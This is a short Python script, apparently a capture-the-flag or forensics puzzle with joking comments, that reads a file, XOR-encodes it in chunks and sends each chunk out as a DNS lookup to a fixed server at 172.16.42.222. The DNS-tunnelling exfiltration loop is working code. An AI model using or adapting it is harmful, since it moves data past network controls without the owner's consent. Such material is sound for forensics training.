#! /usr/bin/python3
# I have no idea of what I'm doing

#Because why not!
import random
import os

f = open('data.txt','rb')
data = f.read()
f.close()

print("[+] Sending %d bytes of data" % len(data))

#This is propa codaz
print("[+] Cut in pieces ... ")

def encrypt(l):
    #High quality cryptographer!
    key = random.randint(13,254)
    output = hex(key)[2:].zfill(2)
    for i in range(len(l)):
        aes = ord(l[i]) ^ key
        #my computer teacher hates me
        output += hex(aes)[2:].zfill(2)
    return output

def udp_secure_tunneling(my_secure_data):
    #Gee, I'm so bad at coding
    #if 0:
    mycmd = "host -t A %s.local.tux 172.16.42.222" % my_secure_data
    os.system(mycmd)
    #We loose packet sometimes?
    os.system("sleep 1")
    #end if

def send_data(s):
    #because I love globals
    global n
    n = n+1
    length = random.randint(4,11)
    # If we send more bytes we can recover if we loose some packets?
    redundancy = random.randint(2,16)
    chunk = data[s:s+length+redundancy].decode("utf-8")
    chunk = "%04d%s"%(s,chunk)
    print("%04d packet --> %s.local.tux" % (n,chunk))
    blob = encrypt(chunk)
    udp_secure_tunneling(blob)
    return s + length

cursor = 0
n=0
while cursor<len(data):
    cursor = send_data(cursor)

#Is it ok?
